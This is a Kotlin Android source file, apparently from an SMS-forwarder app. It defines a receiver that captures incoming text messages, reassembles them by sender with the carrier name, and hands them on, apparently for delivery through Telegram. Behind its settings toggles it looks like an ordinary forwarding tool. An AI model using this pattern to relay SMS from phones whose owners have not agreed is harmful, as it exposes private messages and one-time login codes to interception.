package ru.pushtoweb.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.TelephonyManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsBroadcastReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent?.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        val pendingResult = goAsync()

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val prefs = context.getSharedPreferences("forwarder_service_prefs", Context.MODE_PRIVATE)
                val serviceRunning = prefs.getBoolean("key_service_running", false)
                val smsEnabled = prefs.getBoolean("key_sms_enabled", true)
                if (!serviceRunning || !smsEnabled) {
                    pendingResult.finish()
                    return@launch
                }

                TelegramSender.ensureConfigLoaded(context)
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                val operatorName = tm?.networkOperatorName ?: ""

                if (!messages.isNullOrEmpty()) {
                    // Group parts by sender (address) and assemble all segments
                    val grouped = messages.groupBy { it.originatingAddress ?: "SMS" }
                    for ((sender, smsList) in grouped) {
                        val fullText = smsList.joinToString("") { it.messageBody ?: "" }
                        if (fullText.isNotBlank()) {
                            SmsAssembler.onSmsReceived(
                                context = context.applicationContext,
                                sender = sender,
                                text = fullText,
                                operator = operatorName
                            )
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                pendingResult.finish()
            }
        }
    }
}
